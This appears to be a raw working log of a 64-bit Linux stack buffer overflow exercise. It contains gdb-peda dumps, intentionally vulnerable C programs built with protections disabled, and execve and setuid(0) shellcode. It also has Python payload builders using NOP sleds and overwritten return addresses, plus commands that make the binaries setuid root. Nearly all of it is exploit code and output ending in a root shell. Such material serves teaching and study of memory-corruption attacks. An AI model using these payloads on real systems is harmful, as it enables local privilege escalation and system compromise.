0x7fffffffe3b0:	0x41414141050f3bb0	0x4141414141414141
0x7fffffffe3c0:	0x4242424242424242	0x0000434343434343
0x7fffffffe3d0:	0x0000000000000002	0x00007fffffffe4a8
0x7fffffffe3e0:	0x0000000200008000	0x0000000000400537
0x7fffffffe3f0:	0x0000000000000000	0xc98829709bee3aa4
0x7fffffffe400:	0x0000000000400450	0x00007fffffffe4a0
0x7fffffffe410:	0x0000000000000000	0x0000000000000000
0x7fffffffe420:	0x3677d60f574e3aa4	0x3677c6b026703aa4
0x7fffffffe430:	0x00007fff00000000	0x0000000000000000
0x7fffffffe440:	0x0000000000000000	0x00007ffff7de5733
0x7fffffffe450:	0x00007ffff7dcb638	0x00000000236990af
0x7fffffffe460:	0x0000000000000000	0x0000000000000000
0x7fffffffe470:	0x0000000000000000	0x0000000000400450
0x7fffffffe480:	0x00007fffffffe4a0	0x000000000040047a
0x7fffffffe490:	0x00007fffffffe498	0x000000000000001c
0x7fffffffe4a0:	0x0000000000000002	0x00007fffffffe6e1
0x7fffffffe4b0:	0x00007fffffffe6f8	0x0000000000000000
0x7fffffffe4c0:	0x00007fffffffe777	0x00007fffffffed63
0x7fffffffe4d0:	0x00007fffffffed95	0x00007fffffffedb7

0x 7f ff ff ff e3 60

r $(python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\x60\xe3\xff\xff\xff\x7f'")

\x60\xe3\xff\xff\xff\x7f


EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400573 <main+60>:	call   0x400440 <printf@plt>
   0x400578 <main+65>:	mov    eax,0x0
   0x40057d <main+70>:	leave  
=> 0x40057e <main+71>:	ret    
   0x40057f:	nop
   0x400580 <__libc_csu_init>:	push   r15
   0x400582 <__libc_csu_init+2>:	push   r14
   0x400584 <__libc_csu_init+4>:	mov    r15,rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3c8 --> 0x7fffffffe360 --> 0x9090909090909090 
0008| 0x7fffffffe3d0 --> 0x2 
0016| 0x7fffffffe3d8 --> 0x7fffffffe4a8 --> 0x7fffffffe6e1 ("/home/ubuntu/smash/buf")
0024| 0x7fffffffe3e0 --> 0x200008000 
0032| 0x7fffffffe3e8 --> 0x400537 (<main>:	push   rbp)
0040| 0x7fffffffe3f0 --> 0x0 
0048| 0x7fffffffe3f8 --> 0x40e452b2cceab33e 
0056| 0x7fffffffe400 --> 0x400450 (<_start>:	xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040057e in main ()
gdb-peda$ 


gdb-peda$ c
Continuing.
process 21176 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
$ whoami
[New process 21179]
Error in re-setting breakpoint 1: No symbol "main" in current context.
process 21179 is executing new program: /usr/bin/whoami
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
ubuntu
$ [Inferior 2 (process 21179) exited normally]
Warning: not running


python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\x60\xe3\xff\xff\xff\x7f'" > temp
B`????
process 21338 is executing new program: /bin/dash
$ w
[New process 21344]
process 21344 is executing new program: /usr/bin/w.procps
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 06:02:11 up  3:14,  2 users,  load average: 0.08, 0.02, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ubuntu   tty1     -                22:54    6:39m  0.17s  0.14s -bash
ubuntu   pts/0    192.168.0.25     22:55    1.00s  2.21s  0.00s w
$ [Inferior 2 (process 21344) exited normally]
Warning: not running
gdb-peda$ exit

python -c "print '\x90'*52+'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'+'A'*12+'B'*8+'\x60\xe3\xff\xff\xff\x7f'" > temp

gdb-peda$ r `cat temp`
Starting program: /home/ubuntu/smash/buf `cat temp`
Input was: ????????????????????????????????????????????????????H1??iH1?H??/bin/shH?SH??H1?PWH??;j_j<XAAAAAAAAAAAABBBBBBBB`????
process 21360 is executing new program: /bin/dash
$ whoami
[New process 21366]
process 21366 is executing new program: /usr/bin/whoami
ubuntu
$ [Inferior 2 (process 21366) exited normally]
Warning: not running
gdb-peda$ 



with root

from subprocess import call
nop='\x90'*52     #nop sled
shellcode='\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'
junk='A'*12+'B'*8
ret='0x7fffffffe070'    #return address
return_addr=(ret[2:].decode('hex'))[::-1] #convert return address to little endian. Could have used struct.pack('I',ret) but it doesn't support 64bit address
payload = nop + shellcode + junk + return_addr #final payload
call(['./buf',payload])                         #execute program with payload as argument

-------


gdb-peda$ x/600s $rsp

0x7fffffffe940:	"SSH_CONNECTION=192.168.0.25 55761 192.168.0.35 22"
0x7fffffffe972:	"LESSCLOSE=/usr/bin/lesspipe %s %s"
0x7fffffffe994:	"_=/usr/bin/gdb"
0x7fffffffe9a3:	"LANG=en_US.UTF-8"
0x7fffffffe9b4:	"OLDPWD=/opt/metasploit-framework/embedded/framework/tools/exploit"
0x7fffffffe9f6:	"XDG_SESSION_ID=3"
0x7fffffffea07:	"SHELLCODE=", '\220' <repeats 190 times>...
0x7fffffffeacf:	'\220' <repeats 200 times>...
0x7fffffffeb97:	'\220' <repeats 200 times>...
0x7fffffffec5f:	'\220' <repeats 200 times>...
0x7fffffffed27:	'\220' <repeats 200 times>...
0x7fffffffedef:	"\220\220\220\220\220\220\220\220\220\220H1\377\260i\017\005H1\322H\273\377/bin/shH\301\353\bSH\211\347H1\300PWH\211\346\260;\017\005j\001_j<X\017\005"
0x7fffffffee2a:	"USER=ubuntu"

pdisass 0x7fffffffea07

gdb-peda$ pdisass 0x7fffffffea07
Dump of assembler code from 0x7fffffffea07 to 0x7fffffffea27::	Dump of assembler code from 0x7fffffffea07 to 0x7fffffffea27:
   0x00007fffffffea07:	push   rbx
   0x00007fffffffea08:	rex.W
   0x00007fffffffea09:	rex.RB
   0x00007fffffffea0a:	rex.WR
   0x00007fffffffea0b:	rex.WR
   0x00007fffffffea0c:	rex.XB
   0x00007fffffffea0d:	rex.WRXB
   0x00007fffffffea0e:	rex.R
   0x00007fffffffea0f:	rex.RB cmp eax,0x90909090
   0x00007fffffffea15:	nop
   0x00007fffffffea16:	nop
   0x00007fffffffea17:	nop
   0x00007fffffffea18:	nop
   0x00007fffffffea19:	nop
   0x00007fffffffea1a:	nop
   0x00007fffffffea1b:	nop
   0x00007fffffffea1c:	nop
   0x00007fffffffea1d:	nop
   0x00007fffffffea1e:	nop
   0x00007fffffffea1f:	nop
   0x00007fffffffea20:	nop
   0x00007fffffffea21:	nop
   0x00007fffffffea22:	nop
   0x00007fffffffea23:	nop
   0x00007fffffffea24:	nop
   0x00007fffffffea25:	nop
   0x00007fffffffea26:	nop
End of assembler dump.
gdb-peda$ 


0x00007fffffffea16

ubuntu@ubuntu:~/smash$ cat setuid.py 
junk='A'*112+'B'*8
ret='0x00007fffffffea16'          #new return address somewhere in $SHELLCODE
return_addr=(ret[2:].decode('hex'))[::-1]    #convert return address to little endian.
payload = junk + return_addr                 #final payload
print payload


gdb-peda$ r `python setuid.py`
Starting program: /home/ubuntu/smash/buf `python setuid.py`
/bin/bash: warning: command substitution: ignored null byte in input
Input was: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB????
process 21415 is executing new program: /bin/dash
$ 

Using Read

#include<stdio.h>
#include<string.h>
int main()
{
 char buf[100];
 printf("What is your name? ");
 scanf("%s",buf);
 printf("Hello %s !\n",buf);
 return 0;
}

gcc -no-pie -fno-stack-protector -z execstack inp_prompt.c -o inp_prompt 

(python -c "print '\x90'*52+'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'+'A'*12+'B'*8+'\x08\xe1\xff\xff\xff\x7f'";cat) | ./inp_prompt

export SHELLCODE=$(python -c "print '\x90'*1000+'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'")

(python -c "print 'A'*112+'B'*8+'\x16\xea\xff\xff\xff\x7f'";cat) | ./inp_prompt

0x0000 7f ff ff ff ea 16

0x00007fffffffea16

0x7fffffffe070

$(python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6") 


python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6" > temp


python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\x0e\xea\xff\xff\xff\x7f'" > temp

(cat temp;cat) | ./inp_prompt

 sudo chown root inp_prompt
 sudo chmod +s inp_prompt

0x00007fffffffea0e

-------------


export SHELLCODE=$(python -c "print '\x90'*1000+'\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05'")

ubuntu@ubuntu:~/smash$ cat buf.c 
#include<stdio.h>
#include<string.h>
int main(int argc, char *argv[])
{
char buf[100];
strcpy(buf,argv[1]);
printf("Input was: %s\n",buf);
return 0;
}


r $(python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\x38\xdf\xff\xff\xff\x7f'")


r $(python -c "print '\x90'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'\x18\xea\xff\xff\xff\x7f'")

 sudo chown root buf
 sudo chmod +s buf

ubuntu@ubuntu:~/smash$ ./buf `cat temp`
Input was: ????????????????????????????????????????????????????????????????????????????PH1?H1?H?/bin//shST_?;AAAAAAAAAAAABBBBBBBB????
$ whoami
ubuntu
$ 

ubuntu@ubuntu:~/smash$ ./buf `cat temp`
Input was: ????????????????????????????????????????????????????????????????????????????PH1?H1?H?/bin//shST_?;AAAAAAAAAAAABBBBBBBB????
# whoami
root
# 

ubuntu@ubuntu:~/smash$ ./buf `cat temp`
Input was: ????????????????????????????????????????????????????????????????????????????PH1?H1?H?/bin//shST_?;AAAAAAAAAAAABBBBBBBB????
# id
uid=0(root) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
# whoami
root
# 


```
